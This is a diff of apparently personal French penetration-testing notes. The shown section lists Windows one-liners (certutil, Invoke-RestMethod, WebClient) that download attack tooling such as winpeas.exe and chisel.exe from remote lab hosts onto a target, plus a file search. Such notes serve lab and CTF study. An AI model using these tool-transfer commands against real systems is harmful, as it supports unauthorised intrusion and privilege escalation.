@@ -355,6 +355,7 @@ iface eth0 inet static
 - Télécharger des fichiers via powershell :
 	- `$url = "http://10.10.16.39:8000/python3.zip";$dest = "C:\temp\python.zip";Invoke-RestMethod -Uri $url -OutFile $dest`
 	-  `certutil -urlcache -split -f http://10.10.16.28/winpeas.exe winpeas.exe`
+    - `(New-Object Net.WebClient).DownloadFile('http://10.10.14.128/chisel.exe', 'C:\Windows\Temp\chisel.exe')`
 
 - Trouver un binaire précis en powershell --> `Get-ChildItem -Path C:\ -Filter mysql.exe -Recurse -ErrorAction SilentlyContinue`
 
